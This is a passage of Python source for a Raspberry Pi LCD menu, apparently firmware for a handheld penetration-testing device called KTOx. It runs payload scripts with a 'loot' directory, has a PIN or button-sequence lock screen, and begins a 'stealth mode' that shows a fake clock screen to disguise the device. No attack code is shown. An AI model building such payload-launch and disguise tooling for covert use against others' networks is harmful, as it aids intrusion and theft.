    except Exception:
        pass


def _check_payload_request():
    try:
        with open(PAYLOAD_REQUEST_PATH) as f:
            data = json.load(f)
        os.remove(PAYLOAD_REQUEST_PATH)
        if data.get("action") == "start" and data.get("path"):
            return str(data["path"])
    except (FileNotFoundError, OSError):
        pass
    except Exception:
        pass
    return None


def exec_payload(filename, *args):
    """
    Execute a KTOx/KTOx-compatible payload.
    BLOCKING — menu is frozen until payload exits.
    Fully restores GPIO + LCD after payload calls GPIO.cleanup().
    """
    if isinstance(filename, (list, tuple)):
        args     = tuple(filename[1:]) + args
        filename = filename[0]

    # Resolve absolute path
    if os.path.isabs(filename):
        full = filename
    else:
        full = os.path.join(default.payload_path, filename)
    if not full.endswith(".py"):
        full += ".py"
    if not os.path.isfile(full):
        Dialog(f"Not found:\n{os.path.basename(full)}", wait=True)
        return

    print(f"[PAYLOAD] ► {filename}")
    _write_payload_state(True, filename)
    screen_lock.set()

    env = os.environ.copy()
    env["PYTHONPATH"] = (
        INSTALL_PATH + os.pathsep
        + KTOX_DIR   + os.pathsep
        + env.get("PYTHONPATH", "")
    )
    env["KTOX_PAYLOAD"]      = "1"
    env["KTOX_LOOT_DIR"]     = LOOT_DIR
    env["PAYLOAD_LOOT_DIR"]  = LOOT_DIR

    os.makedirs(LOOT_DIR, exist_ok=True)
    log_fh = open(default.payload_log, "ab", buffering=0)

    try:
        result = subprocess.run(
            ["python3", full] + list(args),
            cwd=INSTALL_PATH,
            env=env,
            stdout=log_fh,
            stderr=subprocess.STDOUT,
        )
        if result.returncode != 0:
            print(f"[PAYLOAD] exit code {result.returncode}")
    except Exception as exc:
        print(f"[PAYLOAD] ERROR: {exc!r}")
    finally:
        log_fh.close()

    # ── Restore hardware ────────────────────────────────────────────────────
    print("[PAYLOAD] ◄ Restoring hardware…")
    _write_payload_state(False)
    try:
        _setup_gpio()
        _load_fonts()

        try:
            if HAS_INPUT:
                rj_input.restart_listener()
        except Exception:
            pass

        # Flush any virtual button events that piled up while the payload ran
        # so they don't trigger unintended menu actions after returning.
        try:
            if HAS_INPUT:
                rj_input.flush()
        except Exception:
            pass

        with draw_lock:
            try:
                draw.rectangle((0, 0, 128, 128), fill=color.background)
                color.DrawBorder()
            except Exception:
                pass

        # Push frame immediately after LCD re-init — closes the white flash
        # window that opens during LCD_Reset() inside _setup_gpio().
        if HAS_HW and LCD and image:
            try:
                LCD.LCD_ShowImage(image, 0, 0)
            except Exception:
                pass

        m.render_current()

        # Drain any held buttons + clear stale state (500ms max)
        global _last_button, _last_button_time, _button_down_since
        _last_button       = None
        _last_button_time  = 0.0
        _button_down_since = 0.0
        if HAS_HW:
            t0 = time.time()
            while (any(GPIO.input(p) == 0 for p in PINS.values())
                   and time.time()-t0 < 0.5):
                time.sleep(0.03)
        _last_button = None  # clear again after drain

    except Exception as _hw_err:
        print(f"[PAYLOAD] hw restore error: {_hw_err!r}")
    finally:
        screen_lock.clear()
    print("[PAYLOAD] ✔ ready")

# ═══════════════════════════════════════════════════════════════════════════════
# ── Network helpers ────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _run(cmd, timeout=15):
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            shell=isinstance(cmd, str)
        )
        return r.returncode, r.stdout + r.stderr
    except Exception as e:
        return -1, str(e)


def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        pass
    # Fallback: read from interface directly
    try:
        rc, out = _run(["ip","-4","addr","show",ktox_state["iface"]], timeout=3)
        import re
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
        if m: return m.group(1)
    except Exception:
        pass
    return "0.0.0.0"


def get_gateway():
    try:
        rc, out = _run(["ip", "route", "show", "default"], timeout=4)
        import re
        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        return m.group(1) if m else ""
    except Exception:
        return ""


def detect_iface():
    """Find first active wired/USB interface — single subprocess call."""
    try:
        rc, out = _run(["ip","-o","link","show"], timeout=5)
        import re
        # Prefer eth0/usb0 (wired), then wlan1 (external wifi), then wlan0
        ifaces = re.findall(r"\d+: (\w+):", out)
        for preferred in ("eth0","usb0","eth1","wlan1"):
            if preferred in ifaces:
                return preferred
        # Return first non-lo non-wlan0 interface
        for i in ifaces:
            if i not in ("lo","wlan0"):
                return i
    except Exception:
        pass
    return "eth0"


def refresh_state():
    ktox_state["iface"]   = detect_iface()
    ktox_state["gateway"] = get_gateway()


def loot_count():
    try: return len(list(Path(LOOT_DIR).glob("**/*")))
    except: return 0

# ═══════════════════════════════════════════════════════════════════════════════
# ── PIN / Sequence Lock Screen ─────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

# ── Constants ─────────────────────────────────────────────────────────────────

LOCK_PIN_PBKDF2_ROUNDS   = 40000
LOCK_SCREEN_STATIC_SECS  = 1.2
LOCK_MODE_PIN            = "pin"
LOCK_MODE_SEQUENCE       = "sequence"
LOCK_SEQUENCE_LENGTH     = 6
LOCK_SEQUENCE_ALLOWED    = ("KEY_UP_PIN","KEY_DOWN_PIN","KEY_LEFT_PIN",
                             "KEY_RIGHT_PIN","KEY1_PIN","KEY2_PIN")
LOCK_SEQUENCE_LABELS     = {"KEY_UP_PIN":"UP","KEY_DOWN_PIN":"DOWN",
                             "KEY_LEFT_PIN":"LEFT","KEY_RIGHT_PIN":"RIGHT",
                             "KEY1_PIN":"KEY1","KEY2_PIN":"KEY2"}
LOCK_SEQUENCE_TOKENS     = {"KEY_UP_PIN":"U","KEY_DOWN_PIN":"D",
                             "KEY_LEFT_PIN":"L","KEY_RIGHT_PIN":"R",
                             "KEY1_PIN":"1","KEY2_PIN":"2"}
LOCK_SEQUENCE_DEBOUNCE   = 0.06
LOCK_TIMEOUT_OPTIONS     = [(0,"Never"),(15,"15 sec"),(30,"30 sec"),
                             (60,"1 min"),(300,"5 min"),(600,"10 min")]

LOCK_DEFAULTS = {
    "enabled": False, "mode": LOCK_MODE_PIN,
    "pin_hash": "", "sequence_hash": "",
    "sequence_length": LOCK_SEQUENCE_LENGTH, "auto_lock_seconds": 0,
}

# ── Runtime state ─────────────────────────────────────────────────────────────

lock_config  = LOCK_DEFAULTS.copy()
lock_runtime = {
    "locked": False, "last_activity": time.monotonic(),
    "in_lock_flow": False, "suspend_auto_lock": False,
    "showing_screensaver": False,
}
_lock_ss_cache = {"path": None, "mtime": None, "frames": [], "durations": []}
_random_screensaver = False

# ── Crypto helpers ────────────────────────────────────────────────────────────

def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

def _hash_pin(pin: str, rounds: int = LOCK_PIN_PBKDF2_ROUNDS) -> str:
    salt = secrets.token_hex(16)
    dk   = hashlib.pbkdf2_hmac("sha256", pin.encode(), salt.encode(), rounds)
    return f"pbkdf2_sha256${rounds}${salt}${_b64url(dk)}"

def _verify_pin(pin: str, encoded: str) -> bool:
    try:
        algo, rounds, salt, digest = encoded.split("$", 3)
        if algo != "pbkdf2_sha256": return False
        dk = hashlib.pbkdf2_hmac("sha256", pin.encode(), salt.encode(), int(rounds))
        return hmac.compare_digest(_b64url(dk), digest)
    except Exception:
        return False

def _hash_sequence(seq: list) -> str:
    return _hash_pin("|".join(seq))

def _verify_sequence(seq: list, encoded: str) -> bool:
    return _verify_pin("|".join(seq), encoded)

# ── Config helpers ────────────────────────────────────────────────────────────

def _lock_mode() -> str:
    m = str(lock_config.get("mode") or LOCK_MODE_PIN)
    return m if m in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE) else LOCK_MODE_PIN

def _lock_mode_label(mode=None) -> str:
    return "Sequence" if (mode or _lock_mode()) == LOCK_MODE_SEQUENCE else "PIN"

def _lock_has_pin() -> bool:
    return bool(str(lock_config.get("pin_hash") or "").strip())

def _lock_has_sequence() -> bool:
    return bool(str(lock_config.get("sequence_hash") or "").strip())

def _lock_has_secret(mode=None) -> bool:
    return _lock_has_sequence() if (mode or _lock_mode()) == LOCK_MODE_SEQUENCE else _lock_has_pin()

def _lock_is_enabled() -> bool:
    return bool(lock_config.get("enabled")) and _lock_has_secret()

def _lock_timeout_label(secs=None) -> str:
    v = int(lock_config.get("auto_lock_seconds") or 0) if secs is None else int(secs)
    for c, lbl in LOCK_TIMEOUT_OPTIONS:
        if c == v: return lbl
    return f"{v} sec" if v > 0 else "Never"

def _mark_user_activity():
    lock_runtime["last_activity"] = time.monotonic()

def _should_auto_lock() -> bool:
    if lock_runtime["locked"] or lock_runtime["in_lock_flow"] or lock_runtime["suspend_auto_lock"]:
        return False
    if not _lock_is_enabled(): return False
    t = int(lock_config.get("auto_lock_seconds") or 0)
    return t > 0 and (time.monotonic() - lock_runtime["last_activity"]) >= t

def _lock_load_from_config(data: dict):
    """Called from ColorScheme.load_from_file — populates lock_config."""
    raw = data.get("LOCK", {})
    if not isinstance(raw, dict): return
    lock_config["enabled"]          = bool(raw.get("enabled", False))
    mode = str(raw.get("mode", LOCK_MODE_PIN)).strip().lower()
    lock_config["mode"]             = mode if mode in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE) else LOCK_MODE_PIN
    lock_config["pin_hash"]         = str(raw.get("pin_hash") or "").strip()
    lock_config["sequence_hash"]    = str(raw.get("sequence_hash") or "").strip()
    lock_config["auto_lock_seconds"] = max(0, int(raw.get("auto_lock_seconds") or 0))
    if lock_config["enabled"] and not _lock_has_secret():
        lock_config["enabled"] = False

def _lock_save_config():
    """Persist lock config into gui_conf.json alongside colors."""
    try:
        path = default.config_file
        try:
            data = json.loads(Path(path).read_text())
        except Exception:
            data = {}
        data["LOCK"] = {
            "enabled": bool(lock_config.get("enabled")),
            "mode": _lock_mode(),
            "pin_hash": str(lock_config.get("pin_hash") or ""),
            "sequence_hash": str(lock_config.get("sequence_hash") or ""),
            "auto_lock_seconds": max(0, int(lock_config.get("auto_lock_seconds") or 0)),
        }
        data.setdefault("PATHS", {})["SCREENSAVER_GIF"] = default.screensaver_gif
        tmp = path + ".tmp"
        Path(tmp).write_text(json.dumps(data, indent=4, sort_keys=True))
        os.replace(tmp, path)
        try: os.chmod(path, 0o600)
        except Exception: pass
    except Exception as e:
        print(f"[LOCK] save_config error: {e}")

# ── Button helpers (used during lock UI) ─────────────────────────────────────

def _wait_button_release(timeout=1.0):
    deadline = time.monotonic() + max(0.0, timeout)
    while time.monotonic() < deadline:
        try:
            if all(GPIO.input(p) != 0 for p in PINS.values()):
                return
        except Exception:
            return
        time.sleep(0.01)

def _get_lock_button():
    """Non-blocking: return pressed button name or None."""
    if HAS_INPUT:
        try:
            v = rj_input.get_virtual_button()
            if v: _mark_user_activity(); return v
        except Exception:
            pass
    if HAS_HW:
        try:
            for name, pin in PINS.items():
                if GPIO.input(pin) == 0:
                    _mark_user_activity(); return name
        except Exception:
            pass
    return None

def _get_sequence_button(held: set):
    """Non-blocking sequence input: returns (button, new_held_set)."""
    if HAS_INPUT:
        try:
            v = rj_input.get_virtual_button()
            if v: _mark_user_activity(); return v, held
        except Exception:
            pass
    cur = set()
    try:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0: cur.add(name)
    except Exception:
        return None, held
    for btn in ("KEY_PRESS_PIN", "KEY3_PIN", *LOCK_SEQUENCE_ALLOWED):
        if btn in cur and btn not in held:
            _mark_user_activity(); return btn, cur
    return None, cur

# ── GIF screensaver ───────────────────────────────────────────────────────────

def _load_ss_frames():
    from PIL import ImageSequence as _IS
    path = str(default.screensaver_gif or "").strip()
    if not path or not os.path.isfile(path): return [], []
    try: mtime = os.path.getmtime(path)
    except OSError: return [], []
    c = _lock_ss_cache
    if c["path"] == path and c["mtime"] == mtime and c["frames"]:
        return c["frames"], c["durations"]
    frames, durs = [], []
    try:
        with Image.open(path) as gif:
            for f in _IS.Iterator(gif):
                frame = f.convert("RGB").resize((128, 128)).copy()
                # Pre-bake lock icon so _draw_ss_frame needs zero PIL work
                try:
                    _tmp_draw = ImageDraw.Draw(frame)
                    _tmp_draw.text((118, 2), "\uf023",
                                   fill=color.selected_text, font=icon_font)
                except Exception:
                    pass
                frames.append(frame)
                ms = f.info.get("duration") or gif.info.get("duration") or 100
                durs.append(max(0.05, ms / 1000.0))
    except Exception:
        frames, durs = [], []
    c.update({"path": path, "mtime": mtime if frames else None,
               "frames": frames, "durations": durs})
    return frames, durs

def _draw_ss_frame(frame):
    """Write pre-composited frame directly to LCD — no PIL overhead."""
    try:
        if HAS_HW and LCD: LCD.LCD_ShowImage(frame, 0, 0)
    except Exception: pass

def _apply_random_screensaver():
    if not _random_screensaver: return
    sdir = os.path.join(default.install_path, "img", "screensaver")
    try:
        gifs = [f for f in os.listdir(sdir) if f.lower().endswith(".gif")]
        if gifs:
            import random as _r
            default.screensaver_gif = os.path.join(sdir, _r.choice(gifs))
    except Exception: pass

def _show_lock_wake(reason="Locked"):
    try:
        with draw_lock:
            draw.rectangle([0,0,128,128], fill=color.background)
            draw.line([(0,12),(128,12)], fill=color.border, width=5)
            draw.text((64, 35), "\uf023", font=icon_font, fill=color.selected_text, anchor="mm")
            draw.text((64, 55), reason,   font=text_font,  fill=color.selected_text, anchor="mm")
            draw.text((64, 75), "Press a key", font=text_font, fill=color.text, anchor="mm")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
    except Exception: pass

def _play_ss_until_input(reason="Locked", skip_static=False) -> str:
    """Show static wake screen (optional), then GIF loop. Returns first button pressed."""
    if not skip_static:
        _show_lock_wake(reason)
        deadline = time.monotonic() + LOCK_SCREEN_STATIC_SECS
        while time.monotonic() < deadline:
            b = _get_lock_button()
            if b: return b
            time.sleep(0.01)

    frames, durs = _load_ss_frames()
    if not frames:
        # No GIF available — fall back to static wake screen and wait
        if skip_static:
            _show_lock_wake(reason)
        while True:
            b = _get_lock_button()
            if b: return b
            time.sleep(0.01)

    lock_runtime["showing_screensaver"] = True
    try:
        idx = 0
        while True:
            _draw_ss_frame(frames[idx])
            t0 = time.monotonic()
            while time.monotonic() - t0 < durs[idx]:
                b = _get_lock_button()
                if b: return b
                time.sleep(0.008)
            idx = (idx + 1) % len(frames)
    finally:
        lock_runtime["showing_screensaver"] = False

# ── PIN keypad UI ─────────────────────────────────────────────────────────────

_KEYPAD = (("1","2","3"),("4","5","6"),("7","8","9"),("C","0","OK"))

def _draw_pin_screen(title, prompt, entered, row, col):
    try:
        with draw_lock:
            draw.rectangle([0,0,128,128], fill=color.background)
            draw.line([(0,12),(128,12)], fill=color.border, width=5)
            draw.text((4, 1),  title,  font=text_font, fill=color.selected_text)
            draw.text((4, 14), prompt, font=text_font, fill=color.text)
            for i in range(4):
                x0 = 6 + i * 28; y0 = 28; x1 = x0+22; y1 = y0+14
                filled = i < len(entered)
                draw.rectangle([x0,y0,x1,y1],
                               fill=(color.select if filled else "#07140b"),
                               outline=(color.selected_text if filled else color.border))
                draw.text(((x0+x1)//2, (y0+y1)//2),
                          "*" if filled else "•",
                          font=text_font, fill=color.selected_text, anchor="mm")
            for r, row_keys in enumerate(_KEYPAD):
                for c2, key in enumerate(row_keys):
                    kx = 6  + c2 * 38; ky = 48 + r * 18
                    kx1 = kx+32; ky1 = ky+14
                    sel = (r == row and c2 == col)
                    draw.rectangle([kx,ky,kx1,ky1],
                                   fill=(color.select if sel else "#07140b"),
                                   outline=(color.selected_text if sel else color.border))
                    draw.text(((kx+kx1)//2, (ky+ky1)//2),
                              key, font=text_font,
                              fill=(color.selected_text if sel else color.text),
                              anchor="mm")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
    except Exception: pass

_LOCK_INPUT_IDLE_SECS = 30   # return to screensaver after this many idle seconds

def _enter_pin(title, prompt, allow_cancel=True) -> "str | None":
    """Returns PIN string, None (cancel), or '__TIMEOUT__' (idle timeout)."""
    entered = []; row = 0; col = 0; hint = prompt
    prev_susp = lock_runtime["suspend_auto_lock"]
    lock_runtime["suspend_auto_lock"] = True
    try:
        while True:
            _draw_pin_screen(title, hint, entered, row, col)
            btn = getButton(timeout=_LOCK_INPUT_IDLE_SECS)
            if btn is None:
                return "__TIMEOUT__"
            if btn == "KEY_UP_PIN":    row = (row-1) % 4
            elif btn == "KEY_DOWN_PIN": row = (row+1) % 4
            elif btn == "KEY_LEFT_PIN": col = (col-1) % 3
            elif btn == "KEY_RIGHT_PIN": col = (col+1) % 3
            elif btn == "KEY1_PIN":
                if entered: entered.pop()
                hint = prompt
            elif btn in ("KEY2_PIN", "KEY3_PIN"):
                if allow_cancel: return None
            elif btn == "KEY_PRESS_PIN":
                key = _KEYPAD[row][col]
                if key == "C":
                    if entered: entered.pop()
                    hint = prompt
                elif key == "OK":
                    if len(entered) == 4: return "".join(entered)
                    hint = "Need 4 digits"
                elif len(entered) < 4:
                    entered.append(key)
                    if len(entered) == 4: return "".join(entered)
    finally:
        lock_runtime["suspend_auto_lock"] = prev_susp

# ── Sequence UI ───────────────────────────────────────────────────────────────

def _draw_seq_screen(title, prompt, entered, mask=False):
    try:
        with draw_lock:
            draw.rectangle([0,0,128,128], fill=color.background)
            draw.line([(0,12),(128,12)], fill=color.border, width=5)
            draw.text((4, 1),  title,  font=text_font, fill=color.selected_text)
            draw.text((4, 14), prompt, font=text_font, fill=color.text)
            progress = f"{len(entered)}/{LOCK_SEQUENCE_LENGTH}"
            draw.text((124, 1), progress, font=text_font, fill="#7fdc9c", anchor="ra")
            for i in range(LOCK_SEQUENCE_LENGTH):
                x0 = 4 + i*20; y0 = 32; x1 = x0+16; y1 = y0+16
                filled = i < len(entered)
                tok = ("*" if mask else LOCK_SEQUENCE_TOKENS.get(entered[i],"?")) if filled else "•"
                draw.rectangle([x0,y0,x1,y1],
                               fill=(color.select if filled else "#07140b"),
                               outline=(color.selected_text if filled else color.border))
                draw.text(((x0+x1)//2,(y0+y1)//2), tok, font=text_font,
                          fill=color.selected_text, anchor="mm")
            if entered and not mask:
                lbl = LOCK_SEQUENCE_LABELS.get(entered[-1], "")
                draw.text((4, 54), f"Last: {lbl}", font=text_font, fill="#88f0aa")
            draw.text((4, 118), "OK=back  K3=exit", font=text_font, fill="#6ea680")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
    except Exception: pass

def _enter_sequence(title, prompt, allow_cancel=True, mask=False) -> "list | None":
    """Returns sequence list, None (cancel), or '__TIMEOUT__' (idle timeout)."""
    entered = []; hint = prompt; held = set()
    prev_susp = lock_runtime["suspend_auto_lock"]
    lock_runtime["suspend_auto_lock"] = True
    _wait_button_release(0.35)
    _last_seq_input = time.monotonic()
    try:
        while True:
            _draw_seq_screen(title, hint, entered, mask)
            btn, held = _get_sequence_button(held)
            if not btn:
                if time.monotonic() - _last_seq_input >= _LOCK_INPUT_IDLE_SECS:
                    return "__TIMEOUT__"
                time.sleep(0.005)
                continue
            _last_seq_input = time.monotonic()
            if btn in ("KEY2_PIN", "KEY3_PIN"):
                if allow_cancel: return None
                continue
            if btn == "KEY_PRESS_PIN":
                if entered: entered.pop()
                hint = prompt; continue
            if btn not in LOCK_SEQUENCE_ALLOWED: continue
            entered.append(btn)
            hint = prompt
            if len(entered) >= LOCK_SEQUENCE_LENGTH:
                return entered.copy()
    finally:
        lock_runtime["suspend_auto_lock"] = prev_susp

# ── Public lock API ───────────────────────────────────────────────────────────

def lock_device(reason="Locked") -> bool:
    """Show GIF screensaver then PIN/sequence challenge. Returns True on unlock."""
    _apply_random_screensaver()
    if not _lock_has_secret(): return False
    if lock_runtime["locked"]: return True

    lock_runtime["locked"] = True
    prev_susp = lock_runtime["suspend_auto_lock"]
    lock_runtime["in_lock_flow"] = True
    lock_runtime["suspend_auto_lock"] = True
    screen_lock.set()   # own the SPI bus for the entire lock session
    # skip_static=True for manual lock so the screensaver starts immediately
    skip_static = (reason == "Manual lock")
    show_kp = False
    _wait_button_release()
    try:
        while True:
            if not show_kp:
                _play_ss_until_input(reason, skip_static=skip_static)
                skip_static = False   # only skip on first show
                _wait_button_release(); show_kp = True; continue

            if _lock_mode() == LOCK_MODE_SEQUENCE:
                entered = _enter_sequence("Unlock", "Enter 6-step seq",
                                          allow_cancel=False, mask=True)
                stored  = str(lock_config.get("sequence_hash") or "")
                if entered == "__TIMEOUT__":
                    show_kp = False; continue   # idle → back to screensaver
                if entered and _verify_sequence(entered, stored):
                    lock_runtime["locked"] = False; _mark_user_activity()
                    m.render_current(); return True
                Dialog_info("Wrong sequence", wait=False, timeout=1.0)
                show_kp = False   # wrong guess → back to screensaver
            else:
                entered = _enter_pin("Unlock", "Enter 4-digit PIN",
                                     allow_cancel=False)
                stored  = str(lock_config.get("pin_hash") or "")
                if entered == "__TIMEOUT__":
                    show_kp = False; continue   # idle → back to screensaver
                if entered and _verify_pin(entered, stored):
                    lock_runtime["locked"] = False; _mark_user_activity()
                    m.render_current(); return True
                Dialog_info("Wrong PIN", wait=False, timeout=1.0)
                show_kp = False   # wrong guess → back to screensaver
    finally:
        screen_lock.clear()
        lock_runtime["showing_screensaver"] = False
        lock_runtime["in_lock_flow"] = False
        lock_runtime["suspend_auto_lock"] = prev_susp

# ── Lock settings ─────────────────────────────────────────────────────────────

def _set_pin_flow(require_current=False) -> bool:
    if require_current:
        cur = _enter_pin("Change PIN", "Current PIN")
        if not cur or not _verify_pin(cur, str(lock_config.get("pin_hash") or "")):
            Dialog_info("Wrong PIN", wait=False, timeout=1.2); return False
    while True:
        first = _enter_pin("Set PIN", "New 4-digit PIN")
        if first is None: return False
        conf  = _enter_pin("Confirm PIN", "Re-enter PIN")
        if conf is None: return False
        if first != conf:
            Dialog_info("PIN mismatch", wait=False, timeout=1.2); continue
        lock_config["pin_hash"] = _hash_pin(first)
        _lock_save_config()
        Dialog_info("PIN saved", wait=False, timeout=1.0); return True

def _set_sequence_flow(require_current=False) -> bool:
    if require_current:
        cur = _enter_sequence("Change Seq", "Current 6-step")
        if not cur or not _verify_sequence(cur, str(lock_config.get("sequence_hash") or "")):
            Dialog_info("Wrong sequence", wait=False, timeout=1.2); return False
    while True:
        first = _enter_sequence("Set Sequence", "Enter new 6-step")
        if first is None: return False
        conf  = _enter_sequence("Confirm Seq", "Repeat 6-step", mask=True)
        if conf is None: return False
        if first != conf:
            Dialog_info("Seq mismatch", wait=False, timeout=1.2); continue
        lock_config["sequence_hash"] = _hash_sequence(first)
        _lock_save_config()
        Dialog_info("Sequence saved", wait=False, timeout=1.0); return True

def _set_active_secret(require_current=False) -> bool:
    if _lock_mode() == LOCK_MODE_SEQUENCE: return _set_sequence_flow(require_current)
    return _set_pin_flow(require_current)

def _verify_current_secret() -> bool:
    if not _lock_has_secret(): return True
    if _lock_mode() == LOCK_MODE_SEQUENCE:
        cur = _enter_sequence("Verify Seq", "Current 6-step", mask=True)
        return bool(cur and _verify_sequence(cur, str(lock_config.get("sequence_hash") or "")))
    cur = _enter_pin("Verify PIN", "Current PIN")
    return bool(cur and _verify_pin(cur, str(lock_config.get("pin_hash") or "")))

def _select_ss_gif() -> None:
    """Browse GIF files in img/screensaver/ and set as screensaver."""
    from PIL import ImageSequence as _IS
    sdir = os.path.join(default.install_path, "img", "screensaver")
    os.makedirs(sdir, exist_ok=True)
    try:
        gifs = sorted(f for f in os.listdir(sdir) if f.lower().endswith(".gif"))
    except Exception:
        gifs = []
    if not gifs:
        Dialog_info("No GIFs found\nin img/screensaver/", wait=False, timeout=1.5)
        return
    idx = 0
    frames, durs = [], []
    need_load = True
    while True:
        if need_load:
            gpath = os.path.join(sdir, gifs[idx])
            Dialog_info(f"Loading...\n{gifs[idx][:16]}", wait=False)
            frames, durs = [], []
            try:
                with Image.open(gpath) as g:
                    for f in _IS.Iterator(g):
                        frames.append(f.convert("RGB").resize((128, 128)).copy())
                        durs.append(max(0.08, (f.info.get("duration") or 100) / 1000.0))
            except Exception:
                Dialog_info("Cannot load GIF", wait=False, timeout=1.0); return
            fidx = 0; need_load = False
        try:
            with draw_lock:
                image.paste(frames[fidx])
                draw.rectangle([0,114,128,128], fill="#000000")
                draw.text((2,115), gifs[idx][:20], font=text_font, fill="#888888")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
        except Exception: pass
        time.sleep(durs[fidx]); fidx = (fidx+1) % len(frames)
        btn = _get_lock_button()
        if btn in ("KEY1_PIN","KEY3_PIN"): break
        elif btn == "KEY_PRESS_PIN":
            default.screensaver_gif = os.path.join(sdir, gifs[idx])
            _lock_ss_cache["path"] = None
            _lock_save_config()
            Dialog_info(f"Screensaver set\n{gifs[idx][:16]}", wait=False, timeout=1.2)
            break
        elif btn in ("KEY_LEFT_PIN","KEY_UP_PIN"):
            idx = (idx-1) % len(gifs); need_load = True; time.sleep(0.2)
        elif btn in ("KEY_RIGHT_PIN","KEY_DOWN_PIN"):
            idx = (idx+1) % len(gifs); need_load = True; time.sleep(0.2)

def OpenLockMenu() -> None:
    """Lock settings menu — accessible from System menu."""
    global _random_screensaver
    while True:
        rand_lbl = "ON" if _random_screensaver else "OFF"
        opts = [
            " Lock now",
            f" {'Deactivate' if lock_config.get('enabled') else 'Activate'} lock",
            f" Lock type: {_lock_mode_label()}",
            f" Change {_lock_mode_label()}",
            f" Auto-lock: {_lock_timeout_label()}",
            " Screensaver GIF",
            f" Random screensaver: {rand_lbl}",
        ]
        sel = GetMenu(opts)
        if not sel: return
        s = sel.strip()
        if s == "Lock now":
            if not _lock_has_secret() and not _set_active_secret(): continue
            lock_device("Locked")
        elif s.startswith("Activate") or s.startswith("Deactivate"):
            if not _lock_has_secret():
                if not _set_active_secret(): continue
            lock_config["enabled"] = not bool(lock_config.get("enabled"))
            _lock_save_config()
            Dialog_info("Lock enabled" if lock_config["enabled"] else "Lock disabled",
                        wait=False, timeout=1.0)
        elif s.startswith("Lock type"):
            prev = _lock_mode()
            labels = [" PIN", " Sequence"]
            choice = GetMenu(labels)
            if not choice: continue
            new_mode = LOCK_MODE_SEQUENCE if "Sequence" in choice else LOCK_MODE_PIN
            if new_mode == prev: continue
            if _lock_has_secret() and not _verify_current_secret(): continue
            lock_config["mode"] = new_mode
            if not _lock_has_secret(new_mode):
                if not _set_active_secret(): lock_config["mode"] = prev; continue
            _lock_save_config()
            Dialog_info(f"Lock type\n{_lock_mode_label(new_mode)}", wait=False, timeout=1.0)
        elif s.startswith("Change"):
            _set_active_secret(require_current=_lock_has_secret())
        elif s.startswith("Auto-lock"):
            labels = [f" {lbl}" for _, lbl in LOCK_TIMEOUT_OPTIONS]
            choice = GetMenu(labels)
            if not choice: continue
            for v, lbl in LOCK_TIMEOUT_OPTIONS:
                if lbl in choice:
                    lock_config["auto_lock_seconds"] = v
                    _lock_save_config()
                    Dialog_info(f"Auto-lock\n{_lock_timeout_label(v)}", wait=False, timeout=1.0)
                    break
        elif s == "Screensaver GIF":
            _select_ss_gif()
        elif s.startswith("Random screensaver"):
            _random_screensaver = not _random_screensaver
            Dialog_info(f"Random screensaver\n{'ON' if _random_screensaver else 'OFF'}",
                        wait=False, timeout=1.2)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Stealth mode ───────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

# ── Stealth clock: cached fonts (loaded once) ─────────────────────────────────
_STEALTH_FONTS = {}

def _stealth_fonts():
    global _STEALTH_FONTS
    if _STEALTH_FONTS:
        return _STEALTH_FONTS
    candidates = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
    ]
    def _load(size, bold=False):
        for p in candidates:
            if bold and "Bold" not in p:
                continue
            if os.path.exists(p):
                try:
                    return ImageFont.truetype(p, size)
                except Exception:
                    pass
        return ImageFont.load_default()

    _STEALTH_FONTS = {
        "big":  _load(34, bold=True),
        "sec":  _load(20, bold=True),
        "med":  _load(13),
        "sml":  _load(10),
    }
    return _STEALTH_FONTS


def _stealth_clock_fallback(ts):
    """
    Animated decoy lock-screen clock drawn into the GLOBAL image/draw objects.
    Uses large TrueType fonts from _stealth_fonts() with sine-wave glow,
    blinking colon, smooth progress bar — all into global image/draw so
    LCD_ShowImage(image, 0, 0) is guaranteed to work.
    Must be called while holding draw_lock.
    """
    now  = datetime.fromtimestamp(ts)
    frac = ts - int(ts)
    sf   = _stealth_fonts()   # {"big":34px, "sec":20px, "med":13px, "sml":10px}

    # ── Pulsing glow: 0.0‥1.0, period ~3 s ───────────────────────────────────
    pulse = 0.5 + 0.5 * math.sin(ts * (2 * math.pi / 3.0))  # 0..1 smooth
    # Blinking colon: on for even seconds
    colon = ":" if (int(ts) % 2 == 0) else " "

    # ── Background gradient emulation (two-rect approach) ─────────────────────
    draw.rectangle([0,  0, 127, 63],  fill=(5,  7, 22))   # top half
    draw.rectangle([0, 64, 127, 127], fill=(8, 11, 30))   # bottom half

    # ── STATUS BAR (row 0–12) ─────────────────────────────────────────────────
    # Network label left
    try:
        draw.text((3, 2), "KTOX", font=sf["sml"], fill=(60, 80, 140))
    except Exception:
        pass
    # WiFi bars (3 bars, top-right area, x=88..105)
    bar_x = 88
    for i, h in enumerate((3, 5, 7)):
        bx = bar_x + i * 6
        by = 10 - h
        draw.rectangle([bx, by, bx + 3, 10], fill=(50, 120, 220))
    # Battery outline (x=108..122, y=3..9)
    draw.rectangle([108, 3, 120, 9], outline=(80, 100, 160), fill=(0, 0, 0))
    draw.rectangle([121, 5, 122, 7], fill=(80, 100, 160))   # nub
    draw.rectangle([109, 4, 117, 8], fill=(60, 190, 80))    # 75% fill
    # Status separator
